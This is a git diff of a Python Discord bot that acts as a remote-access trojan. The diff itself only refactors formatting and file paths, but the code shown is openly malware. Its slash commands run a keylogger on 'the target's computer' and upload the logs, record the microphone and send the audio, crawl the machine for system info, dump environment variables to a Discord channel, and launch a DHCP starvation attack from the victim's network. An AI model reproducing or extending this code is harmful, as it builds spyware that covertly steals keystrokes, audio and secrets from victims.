@@ -1,5 +1,3 @@
-from fileinput import filename
-from time import strftime
 import discord
 import os
 import asyncio
@@ -11,28 +9,24 @@ import screencapture
 import keylogger
 import MicrophoneTap
 import scourinfo
+from time import strftime
 
 load_dotenv()
 
 guild_id_env = os.getenv("DISCORD_GUILD_ID")
-
 intents = discord.Intents.default()
 intents.message_content = True
-
 GUILD_ID = discord.Object(id=guild_id_env)
 
 class Client(commands.Bot):
     async def on_ready(self):
         print(f'Logged on as {self.user}!')
-
         try: 
             guild = discord.Object(id=guild_id_env)
             synced = await self.tree.sync(guild=guild)
             print(f'Synced {len(synced)} commands to guild {guild.id}')
-
         except Exception as e:
             print(f'Error syncing commands: {e}')
-
         try:
             channel_env = os.getenv("DISCORD_BOT_CHANNEL_ID")
             channel = self.get_channel(int(channel_env))
@@ -44,17 +38,13 @@ class Client(commands.Bot):
         except Exception as e:
             print(f"Ignoring exception: \n\n{e}\n\nSkipping the welcome message to be safe!")
           
-
     async def on_message(self, message):
         if message.author == self.user:
             return
-        
         if message.content.startswith('hello'):
             await message.channel.send(f'Hou je kanis, {message.author}!')
-
         if 'bek' in message.content:
             await message.channel.send(f'Nee, jij bent een bek!')
-
 
 client = Client(command_prefix='!', intents=intents)
 
@@ -109,30 +99,24 @@ async def keylog(interaction: discord.Interaction, duration: int=60):
     await interaction.response.defer()
     curDir = os.getcwd()
     klog = keylogger.keylogger(duration)
-    logfile = klog.logname
     klog.start()
     if klog.finished == True:
         try:
-            await interaction.followup.send(file=discord.File("{0}\\logs\\{1}".format(curDir,logfile)))
+            await interaction.followup.send(file=discord.File(f"{curDir}/logs/{klog.logname}"))
         except Exception:
-            await interaction.followup.send(file=discord.File(".\\123456789\logs\\{}".format(logfile)))
-
+            await interaction.followup.send(file=discord.File(f"./123456789/logs/{klog.logname}"))
     print(os.getcwd()[-1:-3])
     os.chdir("123456789")
 
 @client.tree.command(name="microphone", description="Start listening to the user's microphone for n seconds. Defaults to 60 seconds", guild=GUILD_ID)
 async def mictap(interaction: discord.Interaction, duration: int=60):
-    await interaction.response.send_message(content="Okiedokie! Listening for {} seconds".format(duration))
-    
-    
+    await interaction.response.send_message(content=f"Okiedokie! Listening for {duration} seconds")
     curDir = os.getcwd()
     micTap = MicrophoneTap.MicrophoneTap(duration)
     audioFile = micTap.activate()
-
     if audioFile:
-        # Edit the original response to include the file attachment
         msg = await interaction.original_response()
-        await msg.add_files(discord.File("{0}\\{1}".format(curDir, audioFile)))
+        await msg.add_files(discord.File(f"{curDir}/{audioFile}"))
         await msg.edit(content=msg.content+"\nFinished the recording!")
 
 
@@ -148,6 +132,7 @@ async def turnOff(interaction: discord.Interaction):
     await interaction.response.send_message(content="Gotcha, I am leaving now!")
     from sys import exit
     exit(0)
+
 @client.tree.command(name="info", description="Scours the target's computer for basic info", guild=GUILD_ID)
 async def scourInfo(interaction: discord.Interaction):
     crawler = scourinfo.scourinfo()
@@ -166,7 +151,6 @@ async def envir(interaction: discord.Interaction):
     await interaction.response.send_message(file=discord.File(fp="env.txt",  filename="environment.txt"))
     await asyncio.sleep(10)
     os.remove("env.txt")
-
 
 @client.tree.command(name="dhcpstarve", description="Activates a dhcp starvation attack from the target's computer",
                      guild=GUILD_ID)
